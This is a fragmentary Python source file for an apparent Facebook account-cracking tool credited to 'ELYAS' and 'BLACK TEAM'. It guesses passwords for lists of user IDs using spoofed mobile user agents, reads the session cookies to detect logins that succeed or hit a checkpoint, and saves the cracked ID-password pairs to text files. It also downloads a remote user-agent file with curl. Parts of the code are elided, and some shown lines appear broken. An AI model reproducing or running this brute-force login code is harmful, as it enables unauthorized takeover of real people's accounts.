...
if not os.path.isfile('.agents.txt'):
    os.system('curl -L https://raw.githubusercontent.com/AfghanHack001/agent/main/.agents.txt > .agents.txt')
ct = datetime.now()
n = ct.month
...
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-G965U)AppleWebKit/537.36 (KHTML, like Gecko)SamsungBrowser/10.2 Chrome/71.0.3578.99 MobileSafari/537.36;]"}
...
def main():
    ...
    print('\033[1;92m│\033[1;37m[03] \033[1;96mRANDOM CLONING \033[1;37m[\033[1;32mCP/OK MIX IDS\033[1;37m]\033[1;31m (\033[1;32mFAST\033[1;31m) \033[1;32m │')
    ...
    print('\033[1;92m│\033[1;37m[07] \033[1;96REMOVE COOKIES\033[1;32m                           │')
    print('\033[1;92m│\033[1;37m[00] \033[1;91mEXIT\033[1;32m                                   │ ')
    print('\033[1;32m└────────────────────────────────────────────┘')
    print('')
    psy = input('\033[1;37m[+] \033[1;32mSELECT OPTION : ')
    if psy in ('1', '01'): 
        __crack__().plerr()
    if psy in ('2', '02'):
    ...
    if psy in ('6', '06'):
    	os.system("xdg-open https://www.facebook.com/100041365720938")
    if psy in ('7', '07'):
        time.sleep(2)
    ...
    if psy in ('0', '00'):
        exit('THANKS FOR USING ELYAS TOOL')  
    else:
...
class __crack__:
	...
	def __mbasic__(self, user, _sempak_):
		global ok,cp,loop
		sys.stdout.write(f"\r \x1b[1;97m[\033[1;36mBLACK\033[1;37m] {loop}/{len(self.id)} \033[1;37m[\033[1;36mTOTAL-Id\033[1;37m] \033[1;37m[\033[1;36m{len(ok)}\033[1;37m]")
		sys.stdout.flush()
		for pw in _sempak_:
			pw = pw.lower()
			try: os.mkdir('')
			...
			try:
				...
				Adiagents  = 'Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-G950FBuild/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/67.0.3396.87Mobile Safari/537.36;]'
			ses = requests.Session()
			...
			if 'c_user' in ses.cookies.get_dict():
				print('\r\033[1;37m[\033[1;32mBLACK-OK\033[1;37m]\033[1;32m %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
				open('ok.txt','a').write('%s\n' % wrt)
				break
			elif 'checkpoint' in ses.cookies.get_dict():
				print('\r\033[1;31m[\033[1;30mBLACK-CP\033[1;31m]\033[1;30m %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
	...
	def __pler__(self):
		...
		print ("\033[1;37m [3] \033[1;36mMETHOD MEDIUM (BEST) ")
		print(50*"\033[1;97m_")
...
class __filecrack3__:
	...
	def __mbasic__(self, user, _sempak_):
		global ok,cp,loop
		sys.stdout.write(f"\r \x1b[1;97m[\033[1;36mBLACK\033[1;37m] {loop}/{len(self.id)} \033[1;37m[\033[1;32mOK-{len(ok)}\033[1;37m] ")
		sys.stdout.flush()
		for pw in _sempak_:
			pw = pw.lower()
			try: os.mkdir('')
			...
			if 'c_user' in ses.cookies.get_dict():
				...
				try:
					...
					month = bulan_ttl[month].print('\r\033[1;91m[BLACK-CP] %s | %s • %s %s %s%s      ' % (user,pw,day,month,year,tahun(user)))
					wrt = '%s - %s - %s %s %s%s' % (user,pw,day,month,year,tahun(user))
					cp.append(wrt)
					open('BLACK_CP.txt','a').write('%s\n' % wrt)
					break
				except (KeyError, IOError):
					month = ''
					day   = ''
					...
					pass
				print('\r\033[1;91m[BLACK-CP] %s | %s%s      ' % (user,pw,tahun(user)))
	...
	def __pler__(self):
		os.system("clear")
		print(banner)
		print ("\033[1;37m [1] \033[1;36mMETHOD FAST (BEST) ")
		print ("\033[1;37m [2] \033[1;36mMETHOD NORMEL ")
...
banner = """
  ...
  \033[0;91m ██      ██ ██   ██
\033[1;32m┌────────────────────────────────────────────────┐
\033[1;32m│\033[1;31m➣\033[1;37m AUTHOR  \033[1;31m:\033[1;32m ELYAS│\033[1;37m• \033[1;36mTHIS TOOL IS FREE \033[1;37m•\033[1;32m │
\033[1;32m│\033[1;31m➣\033[1;37m FACEBOOK\033[1;31m:\033[1;32m MRr ELYAS│\033[1;37m• \033[1;36mONLY BD PACKAGE   \033[1;37m• \033[1;32m│
\033[1;32m│\033[1;31m➣\033[1;37m WHATSAPP\033[1;31m:\033[1;32m +93787389807  │\033[1;32m──────────────────────\033[1;32m│
\033[1;32m│\033[1;31m➣\033[1;37m GITHUB  \033[1;31m:\033[1;32m AfghanHack001│\033[1;37m  • \033[1;36mPRICE \033[1;31m= \033[1;36mNo\033[1;37m•  \033[1;32m│
\033[1;32m└────────────────────────────────────────────────┘
\033[1;32m│         \033[1;37m•  THIS TOOLS CREATED BY BLACK TEAM\033[1;37m•      \033[1;32m│
\033[1;32m└────────────────────────────────────────────────┘
"""
ct = datetime.now()
n = ct.month
